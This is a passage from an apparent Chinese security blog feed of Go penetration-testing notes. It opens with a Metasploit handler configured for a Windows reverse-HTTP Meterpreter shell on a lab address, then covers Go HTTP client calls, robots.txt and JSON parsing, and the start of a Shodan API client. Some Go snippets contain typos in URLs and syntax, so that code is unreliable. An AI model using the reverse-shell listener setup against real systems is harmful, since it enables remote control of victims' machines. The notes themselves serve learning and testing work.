windows&#x2F;meterpreter_reverse_http<br>msf6 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.68.130<br>LHOST &#x3D;&gt; 192.168.68.130<br>msf6 exploit(multi&#x2F;handler) &gt; set LPORT 80<br>LPORT &#x3D;&gt; 80</p><p>msf6 exploit(multi&#x2F;handler) &gt; set ReverseListenerBindAddress 192.168.68.130<br>ReverseListenerBindAddress &#x3D;&gt; 192.168.68.130<br>msf6 exploit(multi&#x2F;handler) &gt; set ReverseListenerBindPort 20080<br>ReverseListenerBindPort &#x3D;&gt; 20080<br>msf6 exploit(multi&#x2F;handler) &gt; exploit -j -z<br>[<em>] Exploit running as background job 0.<br>[</em>] Exploit completed, but no session was created.</p><p>[*] Started HTTP reverse handler on <a href="http://192.168.68.130:20080/">http://192.168.68.130:20080</a></p></blockquote><blockquote><p> exploit -j -z    #handler后台持续监听</p></blockquote><p>然后，我们再以同样的方式,开一个30080端口</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304125300.png"></p><p>这个没有成功复现，鸽一会</p>]]></content>
    
    
    <summary type="html">HTTP服务器，路由，中间件</summary>
    
    
    
    <category term="Go渗透测试" scheme="https://h0ld1rs.github.io/categories/Go%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang,渗透测试" scheme="https://h0ld1rs.github.io/tags/Golang-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(三)</title>
    <link href="https://h0ld1rs.github.io/posts/32502.html"/>
    <id>https://h0ld1rs.github.io/posts/32502.html</id>
    <published>2022-03-01T13:39:42.000Z</published>
    <updated>2022-03-02T03:45:51.699Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试笔记-三-—HTTP客户端与工具的远程交互"><a href="#Go渗透测试笔记-三-—HTTP客户端与工具的远程交互" class="headerlink" title="Go渗透测试笔记(三)—HTTP客户端与工具的远程交互"></a>Go渗透测试笔记(三)—HTTP客户端与工具的远程交互</h1><h2 id="0x00-Go的HTTP基础知识"><a href="#0x00-Go的HTTP基础知识" class="headerlink" title="0x00 Go的HTTP基础知识"></a>0x00 Go的HTTP基础知识</h2><ol><li>HTTP是一种无状态的协议，服务器不会维护每个请求的状态，而是通过多种方式跟踪其状态，这些方式可能包括：<code>会话标识符，cookie，HTTP标头等</code>。客户端和服务器有责任正确协商和验证状态</li><li>其次，客户端和服务器之间的通信可以一部或者同步进行，但他们需要以<code>请求/响应</code>的方式循环运行。可以在请求头中添加几个选项和表标头，以影响服务器的行为并创建可用的Web应用程序。最常见的是服务器托管Web浏览器渲染的文件，以生成数据的图形化，组织化和时尚化的表示形式。API通常使用<code>XML,JSON,MSGRPC</code>进行通信，某些情况下，可能检索到的是二进制格式，表示下载任意文件类型</li></ol><h2 id="0X01-调用HTTP-API"><a href="#0X01-调用HTTP-API" class="headerlink" title="0X01 调用HTTP API"></a>0X01 调用HTTP API</h2><h3 id="1-调用HTTP方法"><a href="#1-调用HTTP方法" class="headerlink" title="1. 调用HTTP方法"></a>1. 调用HTTP方法</h3><p>包使用<code>net/http</code></p><p>这些函数的使用格式如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get(url <span class="type">string</span>)(resp *Response,err <span class="type">error</span>)</span><br><span class="line">Head(url <span class="type">string</span>)(resp * Response,err <span class="type">error</span>)</span><br><span class="line">Post(url <span class="type">string</span>,bodyType <span class="type">string</span>,body io.Reader)(resp *Response.err <span class="type">error</span>)</span><br></pre></td></tr></table></figure><p>每个函数都将URL字符串作为参数并将其用作请求的目的地。Post函数要比较复杂一些，Post()具有两个附加参数(bodyType 和io.Reader)，其中 bodyType()用于接受正文的<code>Content-Type</code>，HTTP标头，(通常为 application&#x2F;x-www-form-urlencoded)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;net/url&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r1,err := http.Get(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"><span class="comment">//读取响应正文，未显示</span></span><br><span class="line"><span class="keyword">if</span> err !=<span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;无法调用&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> r1.Body.Close()</span><br><span class="line">r2,err := http.Head(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"><span class="comment">//读取响应正文，未显示</span></span><br><span class="line"><span class="keyword">defer</span> r2.Body.Close()</span><br><span class="line">form := url.Values&#123;&#125;</span><br><span class="line">form.Add(<span class="string">&quot;foo&quot;</span>,<span class="string">&quot;bar&quot;</span>)</span><br><span class="line">r3,err := http.Post(</span><br><span class="line"><span class="string">&quot;http://www.goole.com&quot;</span>,</span><br><span class="line"><span class="string">&quot;application/x-www-form-urlencode&quot;</span>,</span><br><span class="line">strings.NewReader(form.Encode()),</span><br><span class="line">)</span><br><span class="line"><span class="comment">//读取响应正文，未显示</span></span><br><span class="line"><span class="keyword">defer</span> r3.Body.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然，Go又一个函数<code>PostForm()</code>可以代替</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;net/url&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r1,err := http.Get(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"><span class="comment">//读取响应正文，未显示</span></span><br><span class="line"><span class="keyword">if</span> err !=<span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;无法调用&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> r1.Body.Close()</span><br><span class="line">r2,err := http.Head(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"><span class="comment">//读取响应正文，未显示</span></span><br><span class="line"><span class="keyword">defer</span> r2.Body.Close()</span><br><span class="line">form := url.Values&#123;&#125;</span><br><span class="line">form.Add(<span class="string">&quot;foo&quot;</span>,<span class="string">&quot;bar&quot;</span>)</span><br><span class="line">r3,err := http.PostForm(<span class="string">&quot;http://www.baidu,com&quot;</span>,form)</span><br><span class="line"><span class="comment">//读取响应正文，未显示</span></span><br><span class="line"><span class="keyword">defer</span> r3.Body.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其他的HTTP动词，如<code>PATCH,PUT,DELETE</code>，不存在便捷函数，我们主要使用这些动词来与<code>RESTFUL api</code>进行交互</p><h3 id="2-生成一个请求"><a href="#2-生成一个请求" class="headerlink" title="2. 生成一个请求"></a>2. 生成一个请求</h3><p>我们可以使用<code>NewRequest()</code>创建结构体 <code>Request</code>，然后使用Client的<code>Do()发送该结构体</code></p><p>结构如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewRequest</span><span class="params">(method, url <span class="type">string</span>, body io.Reader)</span></span> (*Request, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> NewRequestWithContext(context.Background(), method, url, body)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们需要发送一个<code>DELETE</code>的请求，可以</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">req,err := http.NewRequest(<span class="string">&quot;DELETE&quot;</span>,<span class="string">&quot;http://www.baidu.com&quot;</span>,<span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">var</span> client http.Client</span><br><span class="line">resp,err := client.Do(req)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//读取响应内容并关闭</span></span><br><span class="line">resp.Body.Close()</span><br><span class="line">fmt.Println(resp.Status)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面是一个<code>io.Reader</code>的<code>Put</code>请求</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;net/url&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">form := url.Values&#123;&#125;</span><br><span class="line">form.Add(<span class="string">&quot;foo&quot;</span>,<span class="string">&quot;bar&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> client http.Client</span><br><span class="line">req,err := http.NewRequest(</span><br><span class="line"><span class="string">&quot;PUT&quot;</span>,</span><br><span class="line"><span class="string">&quot;http://www.goole.com&quot;</span>,</span><br><span class="line">strings.NewReader(form.Encode()),</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">resp,err := client.Do(req)</span><br><span class="line">fmt.Println(resp.Status)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-使用结构化进行解析"><a href="#3-使用结构化进行解析" class="headerlink" title="3. 使用结构化进行解析"></a>3. 使用结构化进行解析</h3><p>在发送请求后，我们需要<code>ioutil.ReadAll()</code>获取响应正文读取数据，进行一些错误检查，并将HTTP状态码和响应正文打印到<code>stdout</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">resp,err := http.Get(<span class="string">&quot;https://www.baidu.com/robots.txt&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(resp.Status)</span><br><span class="line"><span class="comment">//读取并显示响应正文</span></span><br><span class="line">body,err :=ioutil.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="type">string</span>(body))</span><br><span class="line">resp.Body.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在接收到<code>resp</code>的响应后，可以通过访问可输出的参数<code>Status</code>来检索状态字符串(例如200 OK)，还有一个与此类似的参数<code>StatusCode</code></p><p><code>Response</code>类型。该参数仅存状态字符串的整数部分</p><p><code>Response</code>类型包含一个可输出的参数<code>Body</code>，其类型为<code>io.ReadCloser</code>，<code>ioReadCloser</code>充当<code>io.Reader</code>以及<code>io.Closer</code>的接口，或者需要实现<code>Close()</code>函数以关闭reader并执行任何清理的接口。从<code>io.ReadCloser</code>读取数据后，需要在响应正文上调用<code>Close()</code>函数。使用<code>defer</code>关闭响应正文是一种常见的作法，这样可以保证函数在返回之前将其关闭</p><p>返回内容如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">200 OK</span><br><span class="line">User-agent: Baiduspider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Googlebot</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: MSNBot</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Baiduspider-image</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: YoudaoBot</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Sogou web spider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Sogou inst spider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Sogou spider2</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Sogou blog</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Sogou News Spider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Sogou Orion spider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: ChinasoSpider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Sosospider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-agent: yisouspider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: EasouSpider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure><p>如果需要解析更多的结构化数据，如<code>JSON</code>格式的数据进行<code>API</code>交互，则可以使用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Status <span class="keyword">struct</span> &#123;</span><br><span class="line">Message <span class="type">string</span></span><br><span class="line">Status <span class="type">string</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">res,err := http.Post(</span><br><span class="line"><span class="string">&quot;http://IP:PORT/API&quot;</span>,</span><br><span class="line"><span class="string">&quot;application/json&quot;</span>,</span><br><span class="line"><span class="literal">nil</span>,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> status Status</span><br><span class="line"><span class="keyword">if</span> err := json.NewDecoder(res.Body).Decode(&amp;status);err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">log.Printf(<span class="string">&quot;%s-&gt;%s\n&quot;</span>,status.Status,status.Message)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0X02-构建与Shodan交互的HTTP客户端"><a href="#0X02-构建与Shodan交互的HTTP客户端" class="headerlink" title="0X02 构建与Shodan交互的HTTP客户端"></a>0X02 构建与Shodan交互的HTTP客户端</h2><p>当一个泄露的错误消息的web应用会被列入低危险等级，但是，如果错误消息泄露了企业用户的格式，并且其VPN内使用了单因素身份认证，则这些消息可能会增加通过猜测密码攻击内部网络的可能性</p><p>以<code>Shodan</code>为例子,需要一个<code>Shodan</code>的<code>api密钥</code>。</p><p>从Shodan 站点获取 API 密钥并将其设为环境变量，仅当API密钥为<code>SHODAN_API_KEY</code>的时候，下面示例才能正常工作</p><p><code>SHODAN API</code>非常简单，可以生成良好的<code>JSON</code>响应，对初学者学习<code>API</code>交互很有帮助，以下是步骤</p><ol><li>查看服务的<code>API</code>文档</li><li>设计代码的逻辑结构，以减少代码的复杂性和复用性</li><li>根据需要在<code>Go</code> 中定义请求或者响应类型。</li><li>创建辅助函数或者类型以简化初始化，身份认证和通信，从而减少冗长或者复杂的逻辑</li><li>构建与<code>API</code>消费者函数和类型交互的客户端</li></ol><h3 id="1-清理API调用"><a href="#1-清理API调用" class="headerlink" title="1. 清理API调用"></a>1. 清理API调用</h3><p>在阅读<code>SHODAN</code>文档的时候，你应该已经注意到：每个公开的函数都需要发送<code>API密钥</code>，尽管这个值传递给你所创建的每个消费者函数，但这么操作会非常繁琐。硬编码处理基础<code>https://api.shodan.io</code>也会遇到相同的问题，如下面函数所示，要定义API函数，需要将令牌和URL一起传递给每个函数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span 